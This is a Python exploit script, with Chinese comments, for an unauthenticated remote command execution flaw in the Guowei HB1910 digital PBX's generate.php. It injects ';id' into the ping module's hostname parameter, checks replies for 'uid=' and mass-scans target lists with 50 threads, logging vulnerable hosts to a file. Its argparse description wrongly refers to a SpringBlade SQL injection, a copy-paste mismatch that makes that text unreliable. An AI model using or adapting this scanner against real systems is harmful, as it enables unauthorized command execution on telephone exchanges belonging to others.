#国威HB1910数字程控电话交换机generate.php未授权RCE漏洞
import requests,argparse,sys,re,json,random
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() 
def poc(target):
    payload="/modules/ping/generate.php?send=Ping&hostname=;id"
    user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]
    headers1={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br"
    }
    proxies = {
    "http":"http://127.0.0.1:7890",
    "https":"http://127.0.0.1:7890"
}

    try:
        res2=requests.get(url=target+payload,timeout=5,verify=False,headers=headers1)
        if res2.status_code ==200:
              if 'uid=' in res2.text:
                print(f"[+]{target}存在未授权RCE漏洞")
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
              else:
                print(f"[-]{target}不存在未授权RCE漏洞")
        else:
            print(f"[*]{target}访问有问题，请手工访问")
    except:
        pass
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="SpringBlade api/blade-system/menu/list接口存在SQL注入")
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file path')
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        mp=Pool(50)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage: Python {sys.argv[0]}  -h")

if __name__ =="__main__":
    main()
